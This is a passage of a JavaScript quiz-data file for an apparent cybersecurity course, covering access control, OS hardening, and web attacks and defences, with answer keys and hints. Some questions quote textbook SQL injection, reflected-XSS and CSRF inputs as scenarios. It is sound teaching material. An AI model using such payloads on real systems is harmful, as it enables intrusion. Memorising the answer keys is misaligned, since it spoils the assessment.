            correct: 2,
            hint: "RBAC 'access is based on roles assigned to users' and 'permissions are assigned to roles, not individuals.'",
            wrongReasons: {
              0: "DAC is owner-controlled, not role-based.",
              1: "MAC uses security labels, not roles.",
              3: "ABAC uses attributes, not just roles."
            }
          },
          {
            q: "A system grants access only if: user is a manager AND it's during business hours AND they're on the corporate network. Decisions depend on multiple dynamic conditions. What model?",
            opts: ["DAC", "MAC", "RBAC", "ABAC"],
            correct: 3,
            hint: "ABAC decisions are 'based on attributes' including 'user, resource, environment attributes (time, location).'",
            wrongReasons: {
              0: "DAC is owner-controlled.",
              1: "MAC uses fixed labels.",
              2: "RBAC uses roles alone, not time/location context."
            }
          },
          {
            q: "A bank requires two employees to approve any transaction over $10,000 — one to initiate and one to authorize. No single employee can complete it alone. What principle is this?",
            opts: ["Least privilege", "Need-to-know", "Separation of duties", "Role-based access control"],
            correct: 2,
            hint: "Separation of duties means 'critical tasks are divided among multiple users.'",
            wrongReasons: {
              0: "Least privilege limits access amount, not task division.",
              1: "Need-to-know limits based on necessity, not task splitting.",
              3: "RBAC is a model. This is a principle implemented within any model."
            }
          }
        ]
      },
      {
        id: "5-5", title: "Identity Attacks & Defense", slides: "95-105",
        concept: {
          title: "Attacks on Identity & Access Control",
          body: [
            { type: "bullet", text: "BROKEN ACCESS CONTROL (OWASP Top 10): access restrictions not properly enforced." },
            { type: "bullet", text: "IDOR: app exposes internal IDs (e.g., /profile?id=123). Attacker changes ID to access others' data." },
            { type: "bullet", text: "PRIVILEGE ESCALATION: Vertical (user→admin), Horizontal (user→another user)." },
            { type: "bullet", text: "SESSION HIJACKING: attacker steals cookies or network traffic to control valid sessions." },
            { type: "bullet", text: "TOKEN THEFT: if tokens stored insecurely (localStorage, URLs, logs), attacker reuses them." },
            { type: "bullet", text: "DEFENSE: strong auth (MFA), proper authorisation checks, least privilege, monitor behaviour." },
          ]
        },
        questions: [
          {
            q: "A user changes the URL from /profile?id=123 to /profile?id=124 and views another user's private data. The system only checks if they're logged in. What vulnerability is this?",
            opts: ["Brute-force attack", "Insecure Direct Object Reference (IDOR)", "Credential stuffing", "Privilege escalation"],
            correct: 1,
            hint: "IDOR occurs when 'application exposes internal identifiers' and 'attacker changes ID to access another user's data.'",
            wrongReasons: {
              0: "Brute-force tries many passwords.",
              2: "Credential stuffing uses leaked credentials.",
              3: "Privilege escalation gains higher rights. This is accessing data at the same level."
            }
          },
          {
            q: "An attacker with a regular user account discovers a way to gain full administrator privileges on a system. What type of privilege escalation is this?",
            opts: ["Horizontal escalation", "Vertical escalation", "Lateral movement", "Token theft"],
            correct: 1,
            hint: "Vertical escalation = 'user → admin' (gaining higher access rights).",
            wrongReasons: {
              0: "Horizontal = user → another user at same level.",
              2: "Lateral movement is moving between systems, not escalating privilege level.",
              3: "Token theft is stealing session tokens, not escalating privileges."
            }
          },
          {
            q: "An attacker steals a user's session cookie from an unsecured Wi-Fi network and uses it to access the user's account without knowing their password. What is this?",
            opts: ["Phishing", "Session hijacking", "Credential stuffing", "Brute-force"],
            correct: 1,
            hint: "Session hijacking = 'attacker takes control of a valid user session' and 'does not need to know the password.'",
            wrongReasons: {
              0: "Phishing tricks users into giving credentials.",
              2: "Credential stuffing uses leaked username/password pairs.",
              3: "Brute-force tries many password combinations."
            }
          },
          {
            q: "Which defensive measure directly prevents the IDOR vulnerability where users can access others' data by changing an ID in the URL?",
            opts: ["Stronger password policies", "Proper authorization checks for every request", "Faster internet connection", "More firewalls"],
            correct: 1,
            hint: "'Always enforce proper authorisation checks' and 'validate every request.'",
            wrongReasons: {
              0: "Strong passwords don't prevent authorisation logic flaws.",
              2: "Internet speed has nothing to do with authorisation.",
              3: "Firewalls filter traffic but don't check resource ownership."
            }
          }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────────────
  // MODULE 5 – Operating System & System Security
  // ─────────────────────────────────────────────────────
  {
    id: 6, num: "5",
    title: "OS & System Security",
    icon: "🖥️",
    desc: "OS fundamentals, privilege, hardening, patch management & misconfiguration",
    color: "#00d4ff",
    levels: [
      {
        id: "6-1", title: "OS Security Fundamentals & Trust Models", slides: "2-15",
        concept: {
          title: "OS Security Fundamentals & Trust Models",
          body: [
            { type: "bullet", text: "OS is at the CORE of every computing system — all applications rely on it for security and isolation." },
            { type: "bullet", text: "Most attacks succeed because systems are MISCONFIGURED and privileges are POORLY MANAGED." },
            { type: "bullet", text: "Typical attack path: Initial access → Limited privileges → Privilege escalation → Full compromise." },
            { type: "empty" },
            { type: "section", text: "Trusted Computing Base (TCB)" },
            { type: "bullet", text: "TCB = all components critical to system security: Kernel, Authentication mechanisms, Core services." },
            { type: "bullet", text: "If any part of TCB is compromised, the entire system can no longer be trusted." },
            { type: "bullet", text: "Larger TCB = larger attack surface." },
            { type: "empty" },
            { type: "section", text: "User Space vs Kernel Space" },
            { type: "bullet", text: "Enforced by CPU hardware + OS design." },
            { type: "bullet", text: "Prevents user programs from directly manipulating critical resources." },
            { type: "bullet", text: "If bypassed, attacker gains kernel-level control (full system compromise)." },
          ]
        },
        questions: [
          {
            q: "What is the core reason most attacks succeed according to OS security principles?",
            opts: ["Advanced zero-day exploits", "Systems are misconfigured and privileges are poorly managed", "Weak encryption algorithms", "Attackers have state-sponsored resources"],
            correct: 1,
            hint: "'In reality, most attacks succeed because: systems are misconfigured, privileges are poorly managed.'",
            wrongReasons: {
              0: "Most fail due to misconfiguration, not zero-days.",
              2: "Weak encryption is not highlighted as the main reason.",
              3: "State-sponsored resources are not the focus."
            }
          },
          {
            q: "Which components are part of the Trusted Computing Base (TCB)?",
            opts: ["User applications and web browsers", "Kernel, authentication mechanisms, and core system services", "External APIs and third-party libraries", "Social media plugins"],
            correct: 1,
            hint: "TCB includes 'Kernel, Authentication mechanisms, Core system services.'",
            wrongReasons: {
              0: "User applications are UNTRUSTED components.",
              2: "External APIs are not part of the core TCB.",
              3: "Social media plugins are external, untrusted components."
            }
          },
          {
            q: "A web browser crashes, but the rest of the operating system continues running normally. Which security mechanism makes this possible?",
            opts: ["Firewall filtering", "User space vs kernel space separation", "Network segmentation", "Password hashing"],
            correct: 1,
            hint: "'Prevents user programs from directly manipulating critical resources.' Example: 'A browser crash does not crash the OS.'",
            wrongReasons: {
              0: "Firewalls filter network traffic, not process crashes.",
              2: "Network segmentation divides networks, not process memory.",
              3: "Password hashing protects credentials, not system stability."
            }
          },
          {
            q: "An attacker discovers a vulnerability that allows them to execute code inside kernel space, bypassing all user-space restrictions. What level of control do they gain?",
            opts: ["Limited to the current user's files", "Full kernel-level control over the entire system", "Only network traffic access", "Read-only access to system files"],
            correct: 1,
            hint: "'If this boundary is bypassed, attacker gains kernel-level control.'",
            wrongReasons: {
              0: "User-space restrictions no longer apply in kernel space.",
              2: "Kernel-level access is far more than just network traffic.",
              3: "Kernel compromise grants full read/write/execute control."
            }
          }
        ]
      },
      {
        id: "6-2", title: "Privilege Levels & Least Privilege", slides: "16-30",
        concept: {
          title: "Privilege Levels & Principle of Least Privilege",
          body: [
            { type: "bullet", text: "Linux: Root user (UID 0) has full system control. Regular users have limited permissions." },
            { type: "bullet", text: "Windows: Uses UAC (User Account Control) to manage elevation." },
            { type: "bullet", text: "PRINCIPLE OF LEAST PRIVILEGE (PoLP): give ONLY the permissions necessary." },
            { type: "bullet", text: "PRIVILEGE ESCALATION: Vertical (user→root), Horizontal (user→another user)." },
            { type: "bullet", text: "Privilege + Vulnerability = Impact: high privilege means system-wide compromise." },
            { type: "bullet", text: "PROCESS ISOLATION: each process runs in its own memory space." },
            { type: "bullet", text: "Commands: whoami (username), id (UID/groups), sudo -l (escalation rights)." },
          ]
        },
        questions: [
          {
            q: "In Linux, which user ID (UID) represents the root account with full system control?",
            opts: ["UID 1000", "UID 0", "UID 1", "UID 999"],
            correct: 1,
            hint: "Root user has 'UID 0' and 'Full system control.'",
            wrongReasons: {
              0: "UID 1000 is typically the first regular user account.",
              2: "UID 1 is usually a system service account, not root.",
              3: "UID 999 is not the root account."
            }
          },
          {
            q: "In Windows, even administrators run with limited privileges by default. What mechanism requires explicit approval before granting elevated privileges?",
            opts: ["Windows Defender", "User Account Control (UAC)", "Active Directory", "Task Manager"],
            correct: 1,
            hint: "Windows 'uses User Account Control (UAC) to manage elevation.'",
            wrongReasons: {
              0: "Windows Defender is antivirus, not privilege management.",
              2: "Active Directory manages identities across networks, not local elevation prompts.",
              3: "Task Manager shows processes but doesn't control privilege elevation."
            }
          },
          {
            q: "An attacker compromises a regular user account and then exploits a misconfigured sudo permission to gain root access. What type of privilege escalation is this?",
            opts: ["Horizontal escalation", "Vertical escalation", "Lateral movement", "Session hijacking"],
            correct: 1,
            hint: "Vertical escalation = 'user → admin/root' (gaining higher privileges).",
            wrongReasons: {
              0: "Horizontal escalation = user → another user at same level.",
              2: "Lateral movement moves between systems, not privilege levels.",
              3: "Session hijacking steals an existing session."
            }
          },
          {
            q: "A vulnerability in a low-privilege user app can only modify files in that user's home directory. The same vulnerability in a root-owned service could modify any file on the system. What principle does this illustrate?",
            opts: ["Encryption strength", "Privilege + Vulnerability = Impact", "Network segmentation", "Social engineering"],
            correct: 1,
            hint: "'A vulnerability alone is not always critical. Impact depends on privilege level of exploited process.'",
            wrongReasons: {
              0: "Encryption is not relevant to this scenario about privilege levels.",
              2: "Network segmentation divides networks, not process privileges.",
              3: "Social engineering manipulates humans, not system privileges."
            }
          }
        ]
      },
      {
        id: "6-3", title: "System Hardening & Patch Management", slides: "31-64",
        concept: {
          title: "System Hardening & Patch Management",
          body: [
            { type: "section", text: "System Hardening" },
            { type: "bullet", text: "Goal: Minimize the system's exposure to threats." },
            { type: "bullet", text: "Disable unnecessary services and close unused ports." },
            { type: "bullet", text: "Change default credentials immediately." },
            { type: "bullet", text: "Defense in depth: multiple layers of protection." },
            { type: "bullet", text: "Tools: Ansible (automation), OpenSCAP, Lynis (auditing)." },
            { type: "empty" },
            { type: "section", text: "Patch Management" },
            { type: "bullet", text: "Vulnerability lifecycle: Discovery → Disclosure → Patch → Exploitation." },
            { type: "bullet", text: "After a patch is released, attackers analyze it to develop exploits." },
            { type: "bullet", text: "Unpatched systems become easy targets." },
            { type: "bullet", text: "WannaCry (2017) exploited a known vulnerability with an available patch." },
            { type: "bullet", text: "CONFIGURATION DRIFT = systems deviating from intended configuration over time." },
          ]
        },
        questions: [
          {
            q: "A router is deployed with the default username 'admin' and password 'admin.' Within hours, an attacker logs in and reconfigures the network. What hardening failure occurred?",
            opts: ["The firewall was too strong", "Default credentials were not changed", "The encryption was outdated", "The network was too slow"],
            correct: 1,
            hint: "'Many systems ship with default usernames and passwords. Failure to change defaults leads to immediate compromise.'",
            wrongReasons: {
              0: "A strong firewall would help, not hinder. The issue was credentials.",
              2: "Encryption wasn't the problem — the default password was.",
              3: "Network speed is irrelevant to this credential-based attack."
            }
          },
          {
            q: "The WannaCry ransomware in 2017 spread rapidly and caused massive damage. The exploited vulnerability had a patch released two months earlier. What does this demonstrate?",
            opts: ["The patch was ineffective", "Systems that are not updated become easy and predictable targets", "Ransomware only affects Linux systems", "Encryption cannot stop ransomware"],
            correct: 1,
            hint: "'Systems are compromised due to known vulnerabilities.' Systems that applied the patch were not affected.",
            wrongReasons: {
              0: "The patch was effective — systems that applied it were not affected.",
              2: "WannaCry primarily affected Windows systems.",
              3: "The issue was about patching, not encryption effectiveness."
            }
          },
          {
            q: "Over time, one server in a data center receives security patches while another identical server does not. They gradually have different configurations and vulnerabilities. What is this phenomenon called?",
            opts: ["Role explosion", "Configuration drift", "Privilege escalation", "Session hijacking"],
            correct: 1,
            hint: "'Configuration drift occurs when systems deviate from intended configuration' and 'creates hidden vulnerabilities.'",
            wrongReasons: {
              0: "Role explosion is an RBAC problem with too many roles.",
              2: "Privilege escalation is gaining higher access rights.",
              3: "Session hijacking is stealing user sessions."
            }
          },
          {
            q: "A company delays applying a critical security patch because they are worried it might break a legacy application. From an attacker's perspective, what does this delay create?",
            opts: ["A more secure environment", "A low-effort opportunity for exploitation", "Better system stability", "Improved user experience"],
            correct: 1,
            hint: "'Unpatched systems are Low-effort opportunities' and 'Patch delays directly benefit attackers.'",
            wrongReasons: {
              0: "Delaying patches increases risk, not security.",
              2: "Stability is the company's concern, not the attacker's perspective.",
              3: "User experience is not the attacker's focus."
            }
          }
        ]
      },
      {
        id: "6-4", title: "Misconfiguration as Attack Vector", slides: "65-83",
        concept: {
          title: "Misconfiguration as an Attack Vector",
          body: [
            { type: "bullet", text: "MISCONFIGURATION = incorrect or insecure system setup. A HUMAN error, not a software flaw." },
            { type: "bullet", text: "Does not require complex exploits." },
            { type: "bullet", text: "Often provides direct access to sensitive resources." },
            { type: "bullet", text: "Easily discovered using automated scanning tools." },
            { type: "empty" },
            { type: "section", text: "Common Misconfigurations" },
            { type: "bullet", text: "Open/unnecessary ports." },
            { type: "bullet", text: "Weak or excessive permissions (chmod 777)." },
            { type: "bullet", text: "Default credentials left unchanged." },
            { type: "bullet", text: "Unprotected services (database without password)." },
            { type: "bullet", text: "Disabled security mechanisms (firewall off, antivirus disabled)." },
            { type: "bullet", text: "Over-reliance on 'secure by default' assumptions." },
            { type: "empty" },
            { type: "line", text: "Key insight: Systems are often SECURE BY DESIGN but INSECURE IN DEPLOYMENT." },
          ]
        },
        questions: [
          {
            q: "An attacker finds a database server accessible on the internet with no password required. They connect directly and steal all data without using any exploit. What type of security issue is this?",
            opts: ["Zero-day vulnerability", "Misconfiguration", "Advanced persistent threat", "Social engineering"],
            correct: 1,
            hint: "'Misconfiguration is not a software flaw; it is a human or process error.' No exploit was needed.",
            wrongReasons: {
              0: "A zero-day is an unknown software flaw. No exploit was used.",
              2: "An APT is a long-term, sophisticated attack. This was immediate and simple.",
              3: "Social engineering manipulates people. No human was tricked."
            }
          },
          {
            q: "A company assumes their cloud provider secures everything automatically and never reviews access settings on cloud storage buckets. The buckets are left publicly readable. What cognitive bias contributed?",
            opts: ["Separation of duties", "Over-reliance on 'secure by default'", "Principle of least privilege", "Defense in depth"],
            correct: 1,
            hint: "'Over-reliance on secure by default assumptions.' 'Systems are often: Secure by design, Insecure in deployment.'",
            wrongReasons: {
              0: "Separation of duties divides tasks. This is about assuming security without verification.",
              2: "Least privilege would mean restricting access, not leaving it open.",
              3: "Defense in depth uses multiple layers. This is the opposite — one assumption."
            }
          },
          {
            q: "A system administrator disables the firewall and turns off antivirus on a production server because they were causing performance issues. What type of misconfiguration is this?",
            opts: ["Weak file permissions", "Disabled security controls", "Default credentials", "Open cloud storage"],
            correct: 1,
            hint: "'Security features may be disabled for convenience' including 'Firewall turned off, Antivirus disabled.'",
            wrongReasons: {
              0: "File permissions are about who can access files, not active security tools.",
              2: "Default credentials are unchanged factory passwords.",
              3: "Open cloud storage is about misconfigured cloud buckets."
            }
          },
          {
            q: "Why is misconfiguration often easier to exploit than software vulnerabilities?",
            opts: ["It requires nation-state resources", "It does not require complex exploits and often provides direct access", "It only affects Linux systems", "It cannot be detected by attackers"],
            correct: 1,
            hint: "Misconfiguration 'does not require complex exploits,' 'often provides direct access,' and is 'easily discovered.'",
            wrongReasons: {
              0: "Misconfiguration 'does not require complex exploits.'",
              2: "Misconfiguration affects all systems — Linux, Windows, cloud, etc.",
              3: "Misconfiguration is 'easily discovered using automated scanning tools.'"
            }
          }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────────────
  // MODULE 6 – Web Security Fundamentals
  // ─────────────────────────────────────────────────────
  {
    id: 7, num: "6",
    title: "Web Security Fundamentals",
    icon: "🌐",
    desc: "HTTP, injection, XSS, CSRF, authentication attacks & defensive techniques",
    color: "#ff6b6b",
    levels: [
      {
        id: "7-1", title: "Web Architecture & Core Principles", slides: "2-44",
        concept: {
          title: "Web Architecture & Core Security Principles",
          body: [
            { type: "bullet", text: "Client-side validation improves usability, NOT security. Attackers can bypass it." },
            { type: "bullet", text: "Server enforces security and business rules strictly." },
            { type: "bullet", text: "All user input = potential attack vector (forms, headers, cookies, APIs, file uploads)." },
            { type: "empty" },
            { type: "section", text: "Core Principles" },
            { type: "bullet", text: "NEVER TRUST USER INPUT – validate on server side always." },
            { type: "bullet", text: "INPUT VALIDATION – protects the backend." },
            { type: "bullet", text: "OUTPUT ENCODING – protects the frontend (encode before rendering in browser)." },
            { type: "bullet", text: "FAIL SECURELY – errors must not expose sensitive information." },
            { type: "bullet", text: "DEFENSE IN DEPTH – multiple layers; one failure doesn't break the system." },
            { type: "empty" },
            { type: "section", text: "HTTP & Sessions" },
            { type: "bullet", text: "HTTP is STATELESS – each request processed independently." },
            { type: "bullet", text: "Cookie attributes: Secure (HTTPS only), HttpOnly (not accessible via JS), SameSite (CSRF mitigation)." },
            { type: "bullet", text: "HTTPS protects transport but NOT application-level vulnerabilities (SQLi, XSS)." },
          ]
        },
        questions: [
          {
            q: "A developer believes their web application is secure because they added JavaScript validation. What is wrong with this reasoning?",
            opts: ["JavaScript validation is too slow", "Client-side validation improves usability but not security — attackers can bypass it", "Email validation is not needed", "Server-side validation is less accurate"],
            correct: 1,
            hint: "'Client-side validation improves usability, not security.' Attackers fully control the client environment.",
            wrongReasons: {
              0: "Speed is not the issue.",
              2: "Email validation is important, but the location matters.",
              3: "Server-side validation is the ONLY validation that matters for security."
            }
          },
          {
            q: "A company deploys HTTPS and believes this makes their application fully secure against all web attacks. What is the flaw?",
            opts: ["HTTPS is unnecessary", "HTTPS provides transport security but does not protect against application-level vulnerabilities", "HTTPS only works on mobile", "HTTPS prevents all XSS"],
            correct: 1,
            hint: "'HTTPS protects against network eavesdropping BUT does not protect against application-level vulnerabilities.'",
            wrongReasons: {
              0: "HTTPS is necessary but not sufficient.",
              2: "HTTPS works on all devices with browser support.",
              3: "HTTPS does not prevent XSS — XSS is an application-level output encoding issue."
            }
          },
          {
            q: "A web application sets a session cookie without the HttpOnly flag. An attacker injects JavaScript that reads the cookie. What does the HttpOnly flag prevent?",
            opts: ["Prevents the cookie from being sent to the server", "Prevents JavaScript from accessing the cookie", "Prevents the cookie from expiring", "Prevents HTTPS connections"],
            correct: 1,
            hint: "HttpOnly prevents script-based cookie theft.",
            wrongReasons: {
              0: "HttpOnly doesn't stop the cookie from being sent.",
              2: "Cookie expiration is controlled by the Expires/Max-Age attribute.",
              3: "HTTPS is controlled by the Secure attribute, not HttpOnly."
            }
          },
          {
            q: "A web application shows detailed database error messages including table names when a query fails. An attacker uses these to craft more precise attacks. What principle was violated?",
            opts: ["Least privilege", "Fail securely", "Zero trust", "Defense in depth"],
            correct: 1,
            hint: "'Fail Securely' means 'Errors must not expose sensitive internal information.'",
            wrongReasons: {
              0: "Least privilege limits access. The issue is information exposure.",
              2: "Zero trust is about not trusting components. The issue is error handling.",
              3: "Defense in depth uses multiple layers. The issue is what happens when one fails."
            }
          },
          {
            q: "A system administrator creates session IDs using simple incrementing numbers (session_1, session_2). An attacker guesses the next session ID. What was violated?",
            opts: ["Sessions should be short", "Sessions must be unpredictable and securely generated", "Sessions should be stored in cookies", "Sessions should use localStorage"],
            correct: 1,
            hint: "'Sessions must be unpredictable and securely generated.' Incrementing numbers are trivially guessable.",
            wrongReasons: {
              0: "Short sessions help but the core issue is predictability.",
              2: "Storing in cookies is common practice but doesn't fix predictability.",
              3: "localStorage is less secure than cookies for session data."
            }
          }
        ]
      },
      {
        id: "7-2", title: "Injection & XSS Attacks", slides: "46-58",
        concept: {
          title: "Injection & XSS Attacks",
          body: [
            { type: "section", text: "SQL Injection" },
            { type: "bullet", text: "Occurs when untrusted data is interpreted as code." },
            { type: "bullet", text: "User input concatenated directly into SQL queries." },
            { type: "bullet", text: "Defense: parameterised queries (prepared statements)." },
            { type: "empty" },
            { type: "section", text: "XSS (Cross-Site Scripting)" },
            { type: "bullet", text: "Allows execution of malicious scripts in the victim's browser." },
            { type: "bullet", text: "STORED XSS – payload saved in DB; executes when others view content." },
            { type: "bullet", text: "REFLECTED XSS – payload in URL/response; victim must click link." },
            { type: "bullet", text: "DOM-BASED XSS – client-side DOM manipulation without server reflection." },
            { type: "bullet", text: "Impact: Session hijacking, keylogging, defacement, credential theft." },
            { type: "empty" },
            { type: "line", text: "Injection is NOT limited to SQL — affects APIs, JSON, templates." },
          ]
        },
        questions: [
          {
            q: "A login form takes a username and inserts it into SQL: 'SELECT * FROM users WHERE name = '+username+'. An attacker enters: admin' OR '1'='1. What attack is this?",
            opts: ["Cross-site scripting; missing output encoding", "SQL injection; missing input validation and unsafe string concatenation", "CSRF; missing anti-CSRF tokens", "Session hijacking; weak session IDs"],
            correct: 1,
            hint: "'Injection occurs when untrusted data interpreted as code.' Root cause: missing validation and string concatenation.",
            wrongReasons: {
              0: "XSS is about JavaScript execution in browsers. This is about SQL queries.",
              2: "CSRF tricks users into unwanted actions. This directly manipulates a database query.",
              3: "Session hijacking steals sessions. This is about query manipulation."
            }
          },
          {
            q: "An attacker submits a blog comment containing JavaScript. When other users view the comment, the script runs in their browsers and steals session cookies. What type of XSS is this?",
            opts: ["Reflected XSS", "Stored (persistent) XSS", "DOM-based XSS", "Self-XSS"],
            correct: 1,
            hint: "Stored XSS: payload is saved in the database/server and displayed to all viewers.",
            wrongReasons: {
              0: "Reflected XSS requires the victim to click a malicious link.",
              2: "DOM-based XSS manipulates the client-side DOM without server involvement.",
              3: "Self-XSS requires the victim to run code themselves."
            }
          },
          {
            q: "An attacker sends a victim a link: https://site.com/search?q=<script>stealCookies()</script>. The search page reflects the query without encoding and the script executes. What XSS type is this?",
            opts: ["Stored XSS", "Reflected XSS", "DOM-based XSS", "Blind XSS"],
            correct: 1,
            hint: "Reflected XSS = payload in URL/response, requires victim to visit a link.",
            wrongReasons: {
              0: "Stored XSS requires the payload to be saved on the server.",
              2: "DOM-based XSS happens purely in the browser without server reflection.",
              3: "Blind XSS executes in a backend/admin panel the attacker cannot see."
            }
          },
          {
            q: "An XSS attack allows an attacker to execute JavaScript in a victim's browser. Which of the following is NOT a typical impact of XSS?",
            opts: ["Session hijacking via cookie theft", "Defacement of the website appearance", "Direct deletion of the server's database", "Keylogging of user keystrokes"],
            correct: 2,
            hint: "XSS runs in the browser — it cannot directly delete a server database. That requires SQLi.",
            wrongReasons: {
              0: "XSS commonly steals session cookies for hijacking.",
              1: "XSS can modify the DOM to deface the page.",
              3: "XSS can log keystrokes by capturing keyboard events in the browser."
            }
          },
          {
            q: "Which is a valid defense against SQL injection?",
            opts: ["Only using GET requests for database queries", "Using parameterised queries instead of string concatenation", "Relying on client-side validation", "Disabling HTTPS"],
            correct: 1,
            hint: "'Use parameterised queries for database interactions.' They separate code from data.",
            wrongReasons: {
              0: "GET vs POST doesn't prevent SQL injection.",
              2: "Client-side validation can be bypassed.",
              3: "HTTPS protects data in transit; disabling it would make things worse."
            }
          }
        ]
      },
      {
        id: "7-3", title: "CSRF & Authentication Attacks", slides: "59-74",
        concept: {
          title: "CSRF, Authentication & Access Control Attacks",
          body: [
            { type: "section", text: "CSRF (Cross-Site Request Forgery)" },
            { type: "bullet", text: "Tricks user into sending unintended requests." },
            { type: "bullet", text: "Exploits browser automatically including cookies with requests." },
            { type: "bullet", text: "Server cannot distinguish legitimate from forged requests." },
            { type: "bullet", text: "Defense: Anti-CSRF tokens, SameSite cookie attribute." },
            { type: "empty" },
            { type: "section", text: "IDOR" },
            { type: "bullet", text: "Application exposes internal identifiers in URLs/parameters." },
            { type: "bullet", text: "Attacker changes the ID to access another user's data." },
            { type: "bullet", text: "Server only checks authentication, not authorization/ownership." },
            { type: "empty" },
            { type: "section", text: "Client-Side Trust" },
            { type: "bullet", text: "Never store business logic or security checks in client-side code." },
            { type: "bullet", text: "localStorage is accessible by JavaScript — risky for tokens." },
            { type: "bullet", text: "SameSite cookie attribute helps mitigate CSRF." },
          ]
        },
        questions: [
          {
            q: "A user is logged into their bank. They visit a malicious site containing: <img src='https://bank.com/transfer?to=attacker&amount=10000'>. The browser includes the user's cookies and the money transfers. What attack is this?",
            opts: ["SQL injection", "Cross-Site Request Forgery (CSRF)", "Cross-Site Scripting (XSS)", "Session hijacking"],
            correct: 1,
            hint: "CSRF 'tricks user into sending unintended requests.' 'Exploits browser automatically including authentication credentials.'",
            wrongReasons: {
              0: "SQL injection manipulates database queries.",
              2: "XSS requires script execution. An <img> tag is not script execution.",
              3: "Session hijacking steals the session cookie. Here it's used with the user's browser."
            }
          },
          {
            q: "Which defense directly prevents CSRF by requiring the server to validate that state-changing requests include a unique token known only to the legitimate application?",
            opts: ["HTTPS encryption", "Anti-CSRF tokens", "Output encoding", "SQL parameterised queries"],
            correct: 1,
            hint: "'Use anti-CSRF tokens for state-changing requests.' Server verifies the token matches what it issued.",
            wrongReasons: {
              0: "HTTPS protects data in transit but doesn't prevent forged requests.",
              2: "Output encoding prevents XSS, not CSRF.",
              3: "Parameterised queries prevent SQL injection."
            }
          },
          {
            q: "An application uses URLs like /invoice?id=1001. A logged-in user changes the ID to 1002 and views another customer's invoice. The server verifies the user is logged in but not if they own that invoice. What vulnerability?",
            opts: ["SQL injection", "Insecure Direct Object Reference (IDOR)", "Cross-site scripting", "CSRF"],
            correct: 1,
            hint: "IDOR = 'Application exposes internal identifiers.' 'Attacker changes ID to access another user's data.'",
            wrongReasons: {
              0: "SQL injection manipulates database queries. No query manipulation happened.",
              2: "XSS executes JavaScript in browsers.",
              3: "CSRF tricks users into unwanted actions. The user intentionally changed a URL parameter."
            }
          },
          {
            q: "A developer stores an authentication token in the browser's localStorage because it is convenient to access from JavaScript. What is the security risk?",
            opts: ["localStorage is automatically encrypted", "localStorage is accessible by any JavaScript on the page, making it vulnerable to XSS theft", "localStorage is more secure than cookies", "localStorage prevents CSRF attacks"],
            correct: 1,
            hint: "'Avoid storing sensitive tokens in localStorage.' Any XSS can steal tokens from it.",
            wrongReasons: {
              0: "localStorage is NOT automatically encrypted.",
              2: "localStorage is LESS secure than HttpOnly cookies for tokens.",
              3: "localStorage doesn't prevent CSRF."
            }
          },
          {
            q: "Which cookie attribute helps mitigate CSRF by preventing the browser from sending cookies in cross-site requests?",
            opts: ["HttpOnly", "Secure", "SameSite", "Path"],
            correct: 2,
            hint: "'Set SameSite attribute to mitigate CSRF risks.' SameSite=Strict or Lax prevents cookies from being sent in cross-origin requests.",
            wrongReasons: {
              0: "HttpOnly prevents JavaScript access to cookies. It doesn't control cross-site sending.",
              1: "Secure ensures cookies are only sent over HTTPS.",
              3: "Path limits cookie scope to specific URL paths."
            }
          }
        ]
      },
      {
        id: "7-4", title: "Defensive Techniques", slides: "76-90",
        concept: {
          title: "Defensive Techniques & Security Headers",
          body: [
            { type: "section", text: "Injection Defense" },
            { type: "bullet", text: "Use parameterised queries (prepared statements)." },
            { type: "bullet", text: "Validate and sanitise all user input strictly." },
            { type: "empty" },
            { type: "section", text: "XSS Defense" },
            { type: "bullet", text: "Encode output before rendering user-controlled content." },
            { type: "bullet", text: "Implement Content Security Policy (CSP)." },
            { type: "empty" },
            { type: "section", text: "Security Headers" },
            { type: "bullet", text: "CSP – restricts which resources can load/execute." },
            { type: "bullet", text: "HSTS – forces HTTPS connections (HTTP Strict Transport Security)." },
            { type: "bullet", text: "X-Frame-Options – prevents clickjacking by blocking iframe embedding." },
            { type: "empty" },
            { type: "section", text: "Session Defense" },
            { type: "bullet", text: "Secure session IDs with high entropy." },
            { type: "bullet", text: "Regenerate session IDs after authentication." },
            { type: "bullet", text: "Invalidate sessions on logout and timeout." },
          ]
        },
        questions: [
          {
            q: "Which technique separates SQL code from user data, ensuring user input is always treated as data and never as executable code?",
            opts: ["Base64 encoding", "Parameterised queries (prepared statements)", "URL encoding", "MD5 hashing"],
            correct: 1,
            hint: "'Use parameterised queries for database interactions.' They treat user input strictly as data parameters.",
            wrongReasons: {
              0: "Base64 is for data representation, not query safety.",
              2: "URL encoding is for safe transport in URLs, not database queries.",
              3: "MD5 is a hash function, not a query safety mechanism."
            }
          },
          {
            q: "A developer wants to prevent their banking website from being embedded inside a malicious iframe that tricks users into clicking unintended buttons. Which HTTP security header should they implement?",
            opts: ["Content Security Policy (CSP)", "X-Frame-Options", "HTTP Strict Transport Security (HSTS)", "Access-Control-Allow-Origin"],
            correct: 1,
            hint: "'X-Frame-Options instructs the browser whether a webpage is allowed to be embedded inside a frame or iframe.' 'Prevents clickjacking attacks.'",
            wrongReasons: {
              0: "CSP restricts script/sources but doesn't specifically prevent iframe embedding.",
              2: "HSTS forces HTTPS, not iframe blocking.",
              3: "CORS header controls cross-origin access, not iframe embedding."
            }
          },
          {
            q: "An application processes a state-changing action (deleting an account) via a GET request: /delete-account. A victim clicks a malicious link that triggers this URL. Which two defensive measures would have prevented this?",
            opts: ["Using POST for the action and adding anti-CSRF tokens", "Using GET and adding more JavaScript validation", "Using HTTP instead of HTTPS", "Disabling cookies entirely"],
            correct: 0,
            hint: "'Avoid using GET requests for critical actions.' 'Use anti-CSRF tokens for state-changing requests.'",
            wrongReasons: {
              1: "GET should not be used for state-changing actions. Client-side validation is bypassable.",
              2: "HTTP is less secure than HTTPS.",
              3: "Disabling cookies breaks session-based authentication entirely."
            }
          },
          {
            q: "A security team implements: parameterised queries, output encoding, anti-CSRF tokens, secure session management, and least privilege access control. What security philosophy does this represent?",
            opts: ["Single point of protection", "Defense in depth", "Security through obscurity", "Zero-day prevention"],
            correct: 1,
            hint: "'Defense in depth: Multiple layers of security controls applied simultaneously.' 'No single mechanism should provide full protection.'",
            wrongReasons: {
              0: "The module explicitly rejects single-mechanism protection.",
              2: "Security through obscurity means hiding vulnerabilities. This is about multiple explicit defenses.",
              3: "Zero-day prevention is impossible — this is about layered protection."
            }
          }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────────────
  // MODULE 7 – Secure Software Development Life Cycle
  // ─────────────────────────────────────────────────────
  {
    id: 8, num: "7",
